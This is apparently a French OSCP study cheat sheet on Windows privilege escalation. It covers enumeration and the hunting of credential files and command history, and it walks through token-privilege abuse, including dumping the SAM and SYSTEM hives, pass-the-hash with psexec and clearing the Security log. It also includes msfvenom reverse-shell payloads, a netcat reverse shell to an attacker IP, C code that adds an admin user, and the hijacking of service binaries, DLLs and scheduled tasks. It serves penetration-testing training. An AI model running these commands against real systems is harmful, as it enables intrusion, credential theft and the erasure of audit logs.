---
title: "OSCP · Élévation de privilèges Windows"
description: "Auditer les services, jetons et configurations d'un poste Windows."
---

# OSCP · Élévation de privilèges Windows

Auditer les services, jetons et configurations d'un poste Windows.

## Énumération

**Utilisateur et nom de la machine**

<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Énumération».</p>

```powershell
whoami

```

**Utilisateurs locaux**

<p class="oscp-command-note">Lister les comptes utilisateurs locaux.</p>

```powershell
Get-LocalUser

```

**Groupes locaux**

<p class="oscp-command-note">Lister les groupes locaux de Windows.</p>

```powershell
Get-LocalGroup

```

<p class="oscp-command-note">Lister les groupes locaux Windows.</p>

```powershell
net localgroup

```

<p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>

```powershell
Get-LocalGroupMember -GroupName [GroupName]

```

**Système, version et architecture**

<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>

```powershell
systeminfo

```

**Configuration réseau**

<p class="oscp-command-note">Afficher la configuration réseau Windows.</p>

```powershell
ipconfig /all

```

<p class="oscp-command-note">Afficher ou modifier les routes réseau.</p>

```powershell
route print

```

<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>

```powershell
netstat -ano

```

**Logiciels installés**

<p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"

```

<p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>

```powershell
Select-Object -Property DisplayName

```

<p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"

```

<p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>

```powershell
Select-Object -Property DisplayName

```

**Processus actifs**

<p class="oscp-command-note">Lister les processus et afficher leur nom ainsi que leur chemin.</p>

```powershell
Get-Process | Select-Object -Property ProcessName, Path

```

**Comptes de service**

<p class="oscp-command-note">Examiner les informations système WMI.</p>

```powershell
Get-WmiObject -Class Win32_Service | Select-Object Name, StartName

```

**Tâches planifiées**

<p class="oscp-command-note">Lister les tâches planifiées Windows.</p>

```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State

```

**Membres du groupe Administrateurs**

<p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>

```powershell
Get-LocalGroupMember -GroupName "Administrators"

```

**Lecteurs et volumes**

<p class="oscp-command-note">Lister les lecteurs PowerShell.</p>

```powershell
Get-PSDrive -PSProvider FileSystem

```

**Version de PowerShell**

```text
$PSVersionTable.PSVersion

```

### Utilisateurs, groupes et privilèges Windows

Inventorier les droits du compte courant et les groupes locaux visibles.

<p class="oscp-command-note">Utilisateurs, groupes et privilèges Windows.</p>

```powershell
whoami /all
Get-LocalUser | Select-Object Name,Enabled,LastLogon
Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue
```

### Applications et versions installées

Lire les deux vues du Registre employées par les programmes Windows.

<p class="oscp-command-note">Applications et versions installées.</p>

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName,DisplayVersion
Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName,DisplayVersion
```

### Protections actives

Vérifier les paramètres locaux de Defender et les politiques AppLocker visibles pour le compte.

<p class="oscp-command-note">Protections actives.</p>

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

### RunasCs avec identifiants de laboratoire

Démarrer uniquement une commande d'identification sous le compte de test fourni. RunasCs requiert des identifiants valides et sa syntaxe diffère de celle de `runas.exe`. [Référence officielle](https://github.com/antonioCoco/RunasCs).

<p class="oscp-command-note">RunasCs avec identifiants de laboratoire.</p>

```powershell
RunasCs.exe <UTILISATEUR> <MOT_DE_PASSE> 'cmd /c whoami /all'
```

## Recherche de fichiers

<p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>

```powershell
Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue

# D'autres bons foder pour les choses sont les dossiers web root, Windows ou Linux, par exemple dans Windows (C:\inetpub\wwwroot) certains fichiers de configuration pourraient avoir des chaînes codées en dur.

```

```powershell
# Rechercher les bases KeePass (.kdbx)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

```

```powershell
# Rechercher les fichiers de configuration XAMPP
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

```

```powershell
# Rechercher les sauvegardes et fichiers temporaires
Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue

```

```powershell
# Rechercher les fichiers correspondant au filtre
Get-ChildItem -Path [Path] -File -Recurse | Where-Object { 
    (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*SYSTEM*" -or $_.IdentityReference -like "*Administrators*" }
}

```

```powershell
# Rechercher les fichiers correspondant au filtre
Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length

```

```powershell
# Rechercher les fichiers correspondant au filtre
Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue

```

```powershell
# Rechercher les fichiers correspondant au filtre
Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
    (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*" }
}

```

**Paramètres et repères :**
`Runas`  

```powershell
# Remplacer [Domain\Username] par le nom d'utilisateur cible (par exemple, backupadmin). Vous serez invité à saisir le mot de passe de l'utilisateur spécifié.
runas /user:[Domain\Username] cmd

```

### Fichiers de configuration et coffres

Rechercher des extensions précises sans ouvrir automatiquement les fichiers détectés.

<p class="oscp-command-note">Fichiers de configuration et coffres.</p>

```powershell
Get-ChildItem -Path 'C:\Users' -Recurse -File -Include '*.config','*.ini','*.xml' -ErrorAction SilentlyContinue
Get-ChildItem -Path 'C:\Users' -Recurse -File -Filter '*.kdbx' -ErrorAction SilentlyContinue
```

### Inspecter les éléments de la Corbeille

Lister les entrées de la Corbeille visibles par le compte Windows courant, sans les restaurer ni les exécuter.

<p class="oscp-command-note">Inspecter les éléments de la Corbeille.</p>

```powershell
(New-Object -ComObject Shell.Application).NameSpace(0x0a).Items() | Select-Object Name,Path
```

## Journaux PowerShell

Observer les permissions et la configuration de Windows.

**Paramètres et repères :**
`Get-History`  

```powershell
(Get-PSReadlineOption).HistorySavePath

```

```powershell
$userProfiles = Get-ChildItem -Path C:\Users -Directory

foreach ($profile in $userProfiles) {
    $historyPath = Join-Path -Path $profile.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    
    if (Test-Path $historyPath) {
        Write-Output "User: $($profile.Name)"
        Write-Output "PSReadline History Path: $historyPath"
        Write-Output "--------------------------------"
        Get-Content -Path $historyPath
        Write-Output ""
    }
}

```

### Vérifier les privilèges

<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Vérifier les privilèges».</p>

```powershell
whoami /priv

```

### Activer tous les jetons

```powershell
.\EnableAllTokenPrivs.ps1
whoami /priv

```

<p class="oscp-command-note">Définir les appels C# utilisés pour gérer les privilèges PowerShell.</p>

```powershell
## Attribution du code : Lee Holmes. Référence : https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
$definition = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Set_TokenPermission
{
    public class SetTokenPriv
    {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static void EnablePrivilege()
        {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr();
            hproc = Process.GetCurrentProcess().Handle;
            IntPtr htok = IntPtr.Zero;

            List<string> privs = new List<string>() {  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
            "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
            "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
            "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
            "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
            "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
            "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
            "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
            "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
            "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege" };


            

            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;

            foreach (var priv in privs)
            {
                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
            }
        }
    }  
}
'@

$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege() 2>&1

```

### Tableau des privilèges

**Paramètres et repères :**
`SeAssignPrimaryToken`  

**SeAssignPrimaryToken**

**Paramètres et repères :**
`SeAudit`  

**SeAudit**

```text
Authz Report Security Event

```

**Paramètres et repères :**
`SeBackup`  

**SeBackup**

```text
HKLM\SAM

```

<p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>HKLM\SYSTEM</code></p>

**Paramètres et repères :**
`SAM` · `Administrators` · `SeBackupPrivilege`  

**Paramètres et repères :**
`SeBackup` · `SeRestore`  

**SeBackup**

```text
HKLM\SAM

```

<p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>HKLM\SYSTEM</code></p>

<p class="oscp-command-note">Sauvegarder les ruches du Registre pour l'analyse autorisée.</p>

```powershell
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"

```

**Paramètres et repères :**
`SAM` · `Impacket` · `secretsdump.py`  

<p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Tableau des privilèges» (ne pas exécuter comme une commande).</p>

```text
secretsdump.py -sam SAM -system SYSTEM LOCAL

```

**Paramètres et repères :**
`Administrator` · `Administrators` · `NTLM` · `Impacket`  
`psexec.py`  

<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>

```text
psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>

```

<p class="oscp-command-note">Copier des fichiers avec Robocopy et les options de sauvegarde.</p>

```powershell
robocopy /b

```

<p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>User Account Control</code></p>

**Paramètres et repères :**
`Administrator` · `FilterAdministratorToken` · `SMB` · `NetBIOS`  
`WinRM` · `RDP`  

<p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>Restricted Admin</code></p>

<p class="oscp-inline-ref"><strong>Chemin ou clé Windows :</strong> <code>%WINDIR%\MEMORY.DMP</code></p>

**Paramètres et repères :**
`SeBackupPrivilege` · `SeBackup` · `SeRestore` · `/b`  

<p class="oscp-inline-ref"><strong>Élément de sécurité Windows :</strong> <code>Backup Operators</code></p>

**Paramètres et repères :**
`Copy-FileSeBackupPrivilege` · `SeBackup`  

<p class="oscp-command-note">Charger un module PowerShell.</p>

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll

```

```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll

```

**Paramètres et repères :**
`Set-SeBackupPrivilege`  

<p class="oscp-command-note">Copier le fichier avec les droits SeBackupPrivilege disponibles.</p>

```powershell
Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>

```

**Paramètres et repères :**
`SeChangeNotify`  

**SeChangeNotify**

**Paramètres et repères :**
`SeCreateGlobal`  

**SeCreateGlobal**

**Paramètres et repères :**
`SeCreatePagefile`  

**SeCreatePagefile**

**Paramètres et repères :**
`SeCreatePermanent`  

**SeCreatePermanent**

**Paramètres et repères :**
`SeCreateSymbolicLink`  

**SeCreateSymbolicLink**

**Paramètres et repères :**
`SeCreateToken` · `NtCreateToken`  

**SeCreateToken**

**Paramètres et repères :**
`SeDebug` · `lsass.exe`  

**SeDebug**

**Paramètres et repères :**
`SeDelegateSession-` · `UserImpersonate`  

**SeDelegateSession- UserImpersonate**

**Paramètres et repères :**
`SeEnableDelegation`  

**SeEnableDelegation**

**Paramètres et repères :**
`SeImpersonate` · `SeAssignPrimaryToken`  

**SeImpersonate**

**Paramètres et repères :**
`SeIncreaseBasePriority`  

**SeIncreaseBasePriority**

```text
start /realtime SomeCpuIntensiveApp.exe

```

**Paramètres et repères :**
`SeIncreaseQuota`  

**SeIncreaseQuota**

**Paramètres et repères :**
`SeIncreaseWorkingSet`  

**SeIncreaseWorkingSet**

**Paramètres et repères :**
`SeLoadDriver` · `szkg64.sys` · `fltMC`  

**SeLoadDriver**

```text
fltMC sysmondrv

```

**Paramètres et repères :**
`szkg64`  

**Paramètres et repères :**
`SeLockMemory`  

**SeLockMemory**

**Paramètres et repères :**
`SeMachineAccount`  

**SeMachineAccount**

**Paramètres et repères :**
`SeManageVolume`  

**SeManageVolume**

```text
SYNCHRONIZE | FILE_TRAVERSE

```

**Paramètres et repères :**
`FSCTL_SD_GLOBAL_CHANGE` · `S-1-5-32-544` · `S-1-5-32-545`  

**Paramètres et repères :**
`SeProfileSingleProcess`  

**SeProfileSingleProcess**

**Paramètres et repères :**
`SeRelabel` · `WRITE_OWNER`  

**SeRelabel**

**Paramètres et repères :**
`SeRemoteShutdown`  

**SeRemoteShutdown**

```text
shutdown /s /f /m \\server1 /d P:5:19

```

**Paramètres et repères :**
`SeReserveProcessor`  

**SeReserveProcessor**

**Paramètres et repères :**
`SeRestore`  

**SeRestore**

**Paramètres et repères :**
`SeSecurity`  

**SeSecurity**

```text
wevtutil cl Security

```

<p class="oscp-command-note">Contrôler la configuration des journaux ou tâches Windows.</p>

```powershell
wevtutil sl Security /ms:0

```

**Paramètres et repères :**
`SeShutdown`  

**SeShutdown**

```text
shutdown.exe /s /f /t 1

```

**Paramètres et repères :**
`SeSyncAgent`  

**SeSyncAgent**

**Paramètres et repères :**
`SeSystemEnvironment` · `NtSetSystemEnvironmentValue` · `NtModifyDriverEntry`  

**SeSystemEnvironment**

**Paramètres et repères :**
`SeSystemProfile`  

**SeSystemProfile**

**Paramètres et repères :**
`SeSystemtime`  

**SeSystemtime**

```text
cmd.exe /c date 01-01-01

```

<p class="oscp-command-note">CMD : modifier l'heure système (nécessite les privilèges nécessaires ; ne pas exécuter sans raison).</p>

```powershell
cmd.exe /c time 00:00

```

**Paramètres et repères :**
`SeSystemTime`  

**Paramètres et repères :**
`SeTakeOwnership`  

**SeTakeOwnership**

```text
takeown.exe /f "%windir%\system32"

```

<p class="oscp-command-note">Examiner ou modifier les permissions selon «Tableau des privilèges».</p>

```powershell
icacls.exe "%windir%\system32" /grant "%username%":F

```

**Paramètres et repères :**
`SeTcb`  

**SeTcb**

**Paramètres et repères :**
`SeTimeZone`  

**SeTimeZone**

```text
tzutil /s "Chatham Islands Standard Time"

```

**Paramètres et repères :**
`SeTrustedCredManAccess`  

**SeTrustedCredManAccess**

**Paramètres et repères :**
`SeUndock`  

**SeUndock**

**Paramètres et repères :**
`SeUnsolicitedInput`  

**SeUnsolicitedInput**

### FullPowers.exe

**Paramètres et repères :**
`FullPowers.exe` · `SeAssignPrimaryToken` · `SeImpersonate`  

<p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>

```bash
python3 -m http.server 80

```

![Initial Privileges of the Service Account.](https://www.emmanuelsolis.com/img/fullpowers_1.png)

<p class="oscp-command-note">Windows : télécharger FullPowers.exe avec certutil ou Invoke-WebRequest.</p>

```powershell
# CMD
certutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe FullPowers.exe

# PowerShell
Invoke-WebRequest -Uri http://[kali_ip]/FullPowers.exe -OutFile FullPowers.exe

```

![Downloading FullPowers.exe to victim machine.](https://www.emmanuelsolis.com/img/fullpowers_2.png)

**Paramètres et repères :**
`FullPowers.exe`  

```powershell
# Utilisation de base
./FullPowers.exe

# Essayer d'obtenir un ensemble étendu de privilèges (faible échec avec NETWORK SERVICE)
./FullPowers.exe -x

# Spécifier une ligne de commande à exécuter
./FullPowers.exe -c "powershell -ep Bypass"

# Démarrer un shell vers la machine de l'agresseur (exige que vous ameniez auparavant Netcat à la victime)
./FullPowers.exe -c "C:\Temp\nc64.exe [kali_ip] [port] -e cmd" -z

```

![Running FullPowers.exe.](https://www.emmanuelsolis.com/img/fullpowers_3.png)

**Paramètres et repères :**
`FullPowers.exe`  

<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «FullPowers.exe».</p>

```powershell
whoami /priv

```

![Verifying our New Restored Privileges.](https://www.emmanuelsolis.com/img/fullpowers_4.png)

**Paramètres et repères :**
`SeImpersonate` · `PrintSpoofer.exe` · `GodPotato.exe`  

![Executing Malicious Actions.](https://www.emmanuelsolis.com/img/fullpowers_5.png)

### Vérifications principales

<p class="oscp-command-note">Afficher les informations système avec CIM.</p>

```powershell
# Conseil: Recherchez des services avec des chemins en dehors de `system32` ou d'autres endroits inattendus.; essayez de trouver cette chose qui semble déplacée.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}

```

<p class="oscp-command-note">Examiner ou modifier les permissions selon «Vérifications principales».</p>

```powershell
icacls "C:\Path\To\ServiceBinary.exe"

```

<p class="oscp-command-note">Afficher les informations système avec CIM.</p>

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}

```

<p class="oscp-command-note">Extrait C : exemple technique pour «Vérifications principales» (ce n'est pas une commande de terminal).</p>

```c
#include <stdlib.h>

int main ()
{
  system("net user emma Password123! /add");
  system("net localgroup administrators emma /add");
  return 0;
}

```

```bash
# Compiler le code C pour Windows 64 bits
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

```

<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# Pour exécutable 64 bits
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe

# Pour exécutable 32 bits
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe

```

**Paramètres et repères :**
`msfvenom`  

<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>

```powershell
# N'oubliez pas d'exécuter le serveur HTTP sur votre Kali pour pouvoir apporter le binaire.
iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe

move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"

move .\adduser.exe "C:\Path\To\ServiceBinary.exe"

```

```powershell
Restart-Service -Name '<ServiceName>'

```

**Paramètres et repères :**
`sc.exe`  

```powershell
sc.exe stop <ServiceName>
sc.exe start <ServiceName>

```

<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Vérifications principales».</p>

```powershell
# Première vérification des privilèges de redémarrage : SeShutdownPrivilege doit être assigné et activé.
whoami /priv

# Redémarrer le service
shutdown /r /t 0

```

### Vérifications complémentaires

<p class="oscp-command-note">Copier les fichiers indiqués.</p>

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

```

<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>

```powershell
iwr -uri http://<attacker-ip>/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass
. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name '<ServiceName>'

```

```powershell
$ModifiableFiles = echo 'C:\Path\To\ServiceBinary.exe' | Get-ModifiablePath -Literal

```

<p class="oscp-command-note">Afficher les informations système avec CIM.</p>

```powershell
Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {
    $path = $_.PathName -replace '"', ''
    if (Test-Path $path) {
        icacls $path
    }
}

```

```powershell
# Dépendances des services de la liste
Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}

```

<p class="oscp-command-note">Examiner ou modifier les permissions selon «Vérifications complémentaires».</p>

```powershell
# Certains services utilisent des fichiers de configuration qui peuvent être détournés de façon similaire aux binaires de service. Exemple : Vérification des autorisations dans un fichier de configuration
icacls "C:\Path\To\Service\ConfigFile.ini"

```

**Paramètres et repères :**
`impacket-tool`  

<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>

```bash
strings [downloaded_binary]

flare-floss [downloaded_binary]

# Utilisez dnSpy si vous savez que le binaire a été construit en utilisant .NET.

# Vous pouvez également utiliser des outils tels que PEiD, IDA Pro, ou Ghidra pour analyser le binaire (ce n'est pas recommandé parce que l'examen n'est généralement pas aussi complexe et vous pourriez aller dans un trou de lapin).

```

```powershell
Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}

```

```powershell
# Vérifier les paramètres de mise à jour du système qui pourraient revenir aux modifications
Get-WindowsUpdateLog

```

#### Mises à jour Windows

Examiner l'inventaire des correctifs, qui n'est pas nécessairement exhaustif.

<p class="oscp-command-note">Mises à jour Windows.</p>

```powershell
Get-CimInstance -ClassName Win32_QuickFixEngineering | Select-Object HotFixID,InstalledOn,Description
```

#### Pare-feu Windows

Lire la configuration des profils pare-feu sans la modifier.

<p class="oscp-command-note">Pare-feu Windows.</p>

```powershell
netsh advfirewall show allprofiles
```

### Historique récent du compte courant

Consulter les commandes PSReadLine stockées, sans supposer que l'historique est complet.

<p class="oscp-command-note">Historique récent du compte courant.</p>

```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Tail 50 -ErrorAction SilentlyContinue
```

## Chargement de DLL par un service

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32</code></p>

<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Windows\System32\System</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Windows</code></p>
**Paramètres et repères :**
`PATH` · `ProcMon` · `depends.exe`  

<p class="oscp-command-note">Afficher les informations système avec CIM.</p>

```powershell
# Lister les services en cours d'exécution et leurs chemins exécutables
Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}

```

**Paramètres et repères :**
`PATH`  

```powershell
# Affiche la variable d'environnement PATH
$env:path

```

<p class="oscp-command-note">Extrait C : exemple technique pour «Chargement de DLL par un service» (ce n'est pas une commande de terminal).</p>

```c
#include <windows.h>

BOOL APIENTRY DllMain(
    HMODULE hModule,       // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved      // Reserved
) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Exécuter les commandes système pour créer un compte et lui attribuer des droits d'administration
        system("net user emma Password123! /add");
        system("net localgroup administrators emma /add");
    }
    return TRUE;
}

```

```bash
# Compiler la DLL pour Windows
x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll

```

<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# Pour 64 bits DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll

# Pour DLL 32 bits
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll

```

**Paramètres et repères :**
`msfvenom`  

<p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Chargement de DLL par un service».</p>

```powershell
# Apportez le fichier de votre Kali en utilisant un serveur HTTP

# Déplacer la DLL originale après sauvegarde si nécessaire
move "C:\path\to\original\DLL.dll" "C:\path\to\backup\DLL.dll"

# Remplacez-le par votre DLL malveillant
move "C:\path\to\malicious\myDLL.dll" "C:\path\to\service\DLL.dll"

# Redémarrer le service
Restart-Service -Name "[serviceToHijack]"

```

<p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>

```powershell
# Lister les utilisateurs pour vérifier si le nouvel utilisateur a été ajouté
net user

# Lister les administrateurs locaux pour vérifier si le nouvel utilisateur est un administrateur
net localgroup administrators

```

```powershell
# Affiche la variable d'environnement PATH
$env:path

```

### Configuration et permissions du service

Identifier l'exécutable d'un service puis contrôler ses droits NTFS.

<p class="oscp-command-note">Configuration et permissions du service.</p>

```powershell
sc.exe qc <NOM_SERVICE>
icacls '<CHEMIN_EXECUTABLE>'
```

## Chemins de services sans guillemets

<p class="oscp-command-note">Interroger les informations système via WMI.</p>

```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

```

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>

<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
**Paramètres et repères :**
`.exe`  

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program.exe</code></p>

<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp.exe</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\</code></p>
**Paramètres et repères :**
`app.exe`  

<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\ExampleApp\ExampleService.exe</code></p>

<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program.exe</code></p>
<p class="oscp-command-note">Examiner ou modifier les permissions selon «Chemins de services sans guillemets».</p>

```powershell
icacls "<PathToDirectory>"

```

<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>

```powershell
# Télécharger le script PowerUp
iwr http://<YourServerIP>/PowerUp.ps1 -Outfile PowerUp.ps1

# Politique d'exécution du contournement et exécuter le script
powershell -ep bypass
. .\PowerUp.ps1

# Liste des chemins de service non cités
Get-UnquotedService

```

<p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Chemins de services sans guillemets».</p>

```powershell
# Créer le binaire à partir de Kali, peut être n'importe quel programme, par exemple un shell inverse, ou un programme qui ajoute un nouvel utilisateur.

# Remplacer binaire de service par exécutable malveillant (Manuel)
copy <malicious_file> "C:\Program Files\ExampleApp\Current.exe"

# Remplacer le binaire de service par un exécutable malveillant (avec PowerUp)
Write-ServiceBinary -Name '<ServiceName>' -Path '<PathToMaliciousExecutable>'

# Redémarrer le service
Restart-Service <ServiceName>

# Vérifier l'état du service
Get-Service -Name '<ServiceName>'

# Vérifiez les journaux des événements liés au service
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*<ServiceName>*"}

```

### Lister les chemins des services

Contrôler les espaces et les guillemets des chemins de services avant toute interprétation.

<p class="oscp-command-note">Lister les chemins des services.</p>

```powershell
Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName | Format-Table -AutoSize
```

## Tâches planifiées

<p class="oscp-command-note">Examiner les tâches planifiées Windows.</p>

```powershell
schtasks /query /fo LIST /v

```

<p class="oscp-command-note">Examiner ou modifier les permissions selon «Tâches planifiées».</p>

```powershell
icacls "C:\Path\To\ScheduledTaskExecutable.exe"

```

<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>

```powershell
iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe

move C:\Path\To\TargetDirectory\Executable.exe C:\Path\To\Backup\OriginalExecutable.bak

move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe

```

### Connexions réseau actives

<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>

```bash
netstat -ano

# Exemple de sortie :
Proto  Local address      Remote address     State        PID
tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       -
tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       -
